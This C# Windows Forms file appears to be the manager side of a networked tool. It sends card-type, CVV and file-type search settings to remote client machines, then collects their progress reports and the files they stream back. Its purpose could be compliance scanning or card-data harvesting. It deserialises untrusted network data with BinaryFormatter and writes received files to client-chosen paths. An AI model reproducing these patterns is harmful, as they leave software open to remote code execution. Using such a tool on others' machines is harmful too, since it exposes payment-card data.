using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;

using System.Windows;
using System.Windows.Input;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
using System.Net;
using Protocols;
using System.Threading;
using System.Net.NetworkInformation;
using System.Collections.ObjectModel;

namespace Manager
{
    public partial class Form1 : Form
    {
        private Thread StartThread;
        private Thread UpdateThread;
        private Thread WaitPackThread;

        ObservableCollection<Packet> Proccess = new ObservableCollection<Packet>();

        public Form1()
        {
            InitializeComponent();

            var picture = new PictureBox
            {
                Name = "pictureBox",
                Size = new Size(282, 179),
                
                Image = Image.FromFile("mono.jpg"),

            };
            panelcard.Controls.Add(picture);

            cbCard.SelectedIndex = 0;

            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    tbMyIp.Text = ip.ToString();
                }
            }

        }

        public void StartWork()
        {
            StartThread = new Thread(FindClients);
            StartThread.IsBackground = true;
            StartThread.Name = "FindClients";
            StartThread.Start();
        }

        public void UpdateProgress()
        {
            UpdateThread = new Thread(UpdateProg);
            UpdateThread.IsBackground = true;
            UpdateThread.Name = "UpdateProgress";
            UpdateThread.Start();

            WaitPackThread = new Thread(WaitBigPacket);
            WaitPackThread.IsBackground = true;
            WaitPackThread.Name = "WaitPackThread";
            WaitPackThread.Start();
        }


        public Packet Packet { get;  set; }

        protected void UpdateProg()
        {
            try
            {
                IPAddress ipAddress = IPAddress.Parse(tbMyIp.Text);

                TcpListener listener = new TcpListener(ipAddress, 4568);

                listener.Start();

                while (true)
                {
                    Socket clientSocket = listener.AcceptSocket();

                    byte[] buffer = new byte[8048];

                    int res = clientSocket.Receive(buffer);

                    if (res > 1)
                    {
                        byte[] buf = new byte[res];

                        Array.Copy(buffer, buf, res);

                        Packet = FromByteArray<Packet>(buf);

                        this.Invoke((MethodInvoker)(() => lvProccess.Items.Clear()));
                        this.Invoke((MethodInvoker)(() => lvProccess.Refresh()));

                        foreach (var item in Proccess)
                        {
                            if (item.IPAdress.Equals(Packet.IPAdress))
                            {
                                item.CardType = Packet.CardType;
                                item.CountFiles = Packet.CountFiles;
                                item.CurrentFile = Packet.CurrentFile;
                                item.CVV = Packet.CVV;
                                item.Directory = Packet.Directory;
                                item.FileInfo = Packet.FileInfo;
                                item.FilePath = Packet.FilePath;
                                item.FindNumber = Packet.FindNumber;
                                item.IPAdress = Packet.IPAdress;
                                item.MSOffice = Packet.MSOffice;
                                item.Progress = Packet.Progress;
                                item.Rar = Packet.Rar;

                                ListViewItem items = new ListViewItem();
                                items.Text = item.IPAdress;
                                items.SubItems.Add(item.CardType);
                                items.SubItems.Add(Convert.ToString(item.CVV));
                                items.SubItems.Add(Convert.ToString(item.MSOffice));
                                items.SubItems.Add(Convert.ToString(item.Rar));
                                items.SubItems.Add(item.Directory);
                                items.SubItems.Add("Progress");

                                ProgressBar pb = new ProgressBar();

                                this.Invoke((MethodInvoker)(() => lvProccess.Items.Add(items)));

                                Rectangle r = (Rectangle)GetControl(lvProccess);

                                //Rectangle r = items.SubItems[6].Bounds;

                                pb.SetBounds(r.X, r.Y, r.Width, r.Height);
                                pb.Minimum = 0;
                                pb.Maximum = 100;
                                pb.Value = Convert.ToInt32(item.Progress);
                                pb.Name = "Progress";                   // use the key as the name

                                this.Invoke((MethodInvoker)(() => lvProccess.Controls.Add(pb)));
                            }
                        }
                    }
                    //lvProccess.Items.Clear();
                    clientSocket.Close();
                }
            }
            catch (SocketException ex)
            {
                //Trace.TraceError(String.Format("QuoteServer {0}", ex.Message));
            }
        }

        private delegate object ControlMethodInvoker(ListView ctl);
        public object GetControl(ListView ctl)
        {
            object text;

            if (ctl.InvokeRequired)
            {
                // Delegate.
                text = ctl.Invoke(new ControlMethodInvoker(GetControl),
                                          ctl);
            }
            else
            {
                // Access the control directly.
                text = ctl.Items[0].SubItems[6].Bounds;
            }

            return text;
        }


        private delegate string ControlToStringMethodInvoker(Control ctl);
        public string GetControlText(Control ctl)
        {
            string text;

            if (ctl.InvokeRequired)
            {
                // Delegate.
                text = (string)ctl.Invoke(new ControlToStringMethodInvoker(GetControlText),
                                          ctl);
            }
            else
            {
                // Access the control directly.
                text = ctl.Text;
            }

            return text;
        }

        private void WaitBigPacket()
        {
            while (true)
            {
                try
                {
                    IPAddress ipAddress = IPAddress.Parse(tbMyIp.Text);

                    var listener = new TcpListener(ipAddress, 4570);
                    listener.Start();
                    if (Packet != null)
                        if (!String.IsNullOrEmpty(Packet.FileInfo))
                        {
                            using (var incoming = listener.AcceptTcpClient())
                            using (var networkStream = incoming.GetStream())
                            using (var fileStream = File.OpenWrite(Packet.FileInfo))
                            {
                                networkStream.CopyTo(fileStream);
                            }
                        }

                    listener.Stop();
                }
                catch (SocketException ex)
                {
                    // Trace.TraceError(String.Format("QuoteServer {0}", ex.Message));
                }
            }

        }

        private void FindClients()
        {
            try
            {
                IPAddress ipAddress = IPAddress.Parse(tbMyIp.Text);

                TcpListener listener = new TcpListener(ipAddress, 4569);

                listener.Start();

                while (true)
                {
                    Socket clientSocket = listener.AcceptSocket();

                    string point = ((IPEndPoint)clientSocket.RemoteEndPoint).Address.ToString();

                    if (Proccess.Count == 0)
                    {
                        Proccess.CollectionChanged += Proccess_CollectionChanged;

                        Packet pak = new Packet
                        {
                            CardType = GetControlText(cbCard),
                            CVV = chbCVV.Checked,
                            MSOffice = cbOffice.Checked,
                            Rar = cbRar.Checked,
                            Directory = tbDirectory.Text,
                            IPAdress = point,
                            CountFiles = 0,
                            CurrentFile = 0,
                            FilePath = "",
                            Progress = 0

                        };
                        Proccess.Add(pak);
                    }
                    clientSocket.Close();

                    //Thread.Sleep(5000);
                }
            }
            catch (SocketException ex)
            {
                // Trace.TraceError(String.Format("QuoteServer {0}", ex.Message));
            }

        }

        private void UpdatePackets(Packet item)
        {
                item.CardType = GetControlText(cbCard);
                item.CVV = chbCVV.Checked;
                item.MSOffice = cbOffice.Checked;
                item.Rar = cbRar.Checked;
                item.Directory = tbDirectory.Text;
        }

        private void Proccess_CollectionChanged(object sender, System.Collections.Specialized.NotifyCollectionChangedEventArgs e)
        {
            this.Invoke((MethodInvoker)(() => lbComps.Items.Clear()));

            foreach (var item in Proccess)
            {
                this.Invoke((MethodInvoker)(() => lbComps.Items.Add(item.IPAdress)));
            }
        }

        private void OnSetQuote(string ServerName,int Port, Packet Pak)
        {
            string serverName = ServerName;

            int port = Port;

            TcpClient client = new TcpClient();

            NetworkStream stream = null;

            try
            {
                client.Connect(serverName, port);

                stream = client.GetStream();

                byte[] buffer = ToByteArray<Packet>(Pak);

                stream.Write(buffer, 0, buffer.Length);
            }
            catch (SocketException ex)
            {
                MessageBox.Show(ex.Message, "Ошибка сокета");
            }
            finally
            {
                if (stream != null)
                {
                    stream.Close();
                }

                if (client.Connected)
                {
                    client.Close();
                }
            }

        }

        public byte[] ToByteArray<T>(T obj)
        {
            if (obj == null)
                return null;
            BinaryFormatter bf = new BinaryFormatter();
            using (MemoryStream ms = new MemoryStream())
            {
                bf.Serialize(ms, obj);
                return ms.ToArray();
            }
        }

        public T FromByteArray<T>(byte[] data)
        {
            if (data == null)
                return default(T);
            BinaryFormatter bf = new BinaryFormatter();
            using (MemoryStream ms = new MemoryStream(data))
            {
                object obj = bf.Deserialize(ms);
                return (T)obj;
            }
        }


        private void button1_Click(object sender, EventArgs e)
        {
            foreach (var item in Proccess)
            {
                if (item.IPAdress.Equals(lbComps.SelectedItem.ToString()))
                {
                    UpdatePackets(item);

                    OnSetQuote(item.IPAdress, 4567, item);
                }
            }
        }

        private void Start_Click(object sender, EventArgs e)
        {
            StartWork();

            UpdateProgress();
        }
    }
}
